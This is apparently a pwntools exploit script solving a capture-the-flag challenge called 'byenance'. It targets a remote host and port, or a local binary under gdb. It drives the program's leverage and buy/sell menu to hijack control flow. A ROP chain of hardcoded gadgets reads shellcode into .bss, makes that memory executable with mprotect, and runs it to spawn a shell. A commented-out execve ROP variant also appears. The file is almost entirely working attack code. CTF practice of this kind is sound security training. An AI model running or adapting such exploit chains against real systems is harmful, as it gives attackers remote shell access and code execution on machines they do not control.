from pwn import *

context(arch='amd64', os='linux')

elf = ELF('./byenance')

if len(sys.argv) > 1:
    r = remote('43.200.136.128', 6464)
else:
    r = elf.process()
    gdb.attach(r)

def menu(num):
    r.recvuntil('orders\n')
    r.sendline(num)
    
def buy_eth(amount):
    menu('1')
    print(r.recvuntil('buy?\n'))
    r.sendline(amount)

def sell_eth(amount):
    menu('2')
    print(r.recvuntil('sell?\n'))
    r.sendline(amount)

menu('3')
r.recvuntil('leverage\n')
r.sendline('100')

for i in range(16):
    buy_eth('1')
sell_eth('1')


add_rsp = 0x45284c
pop_rdi = 0x402214
pop_rsi = 0x40a76e
pop_rax = 0x452907
pop_rdx = 0x485e9b
syscall = 0x402954
read = 0x451e80
binsh = 0x4c6590

raw_input()
sell_eth(str(add_rsp))

# syscall rop
# payload = b''
# payload += p64(pop_rdi)
# payload += p64(0)
# payload += p64(pop_rsi)
# payload += p64(binsh)
# payload += p64(read)

# payload += p64(pop_rdi)
# payload += p64(binsh)
# payload += p64(pop_rax)
# payload += (p64(59))
# payload += p64(pop_rdx)
# payload += p64(0) + p64(0)
# payload += p64(pop_rsi)
# payload += p64(0)
# payload += p64(syscall)

# r.sendline(payload)
# r.send(b'/bin/sh\0')

# mprotect rop
bss = elf.bss()
mprotect = elf.symbols['mprotect']
bss = 0x4c7000
shellcode = asm(shellcraft.sh())

payload = b''
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss)
payload += p64(read)

payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi)
payload += p64(0x2000)
payload += p64(pop_rdx)
payload += p64(7)*2
payload += p64(mprotect)
payload += p64(bss)

r.sendline(payload)
r.sendline(shellcode)

r.interactive()
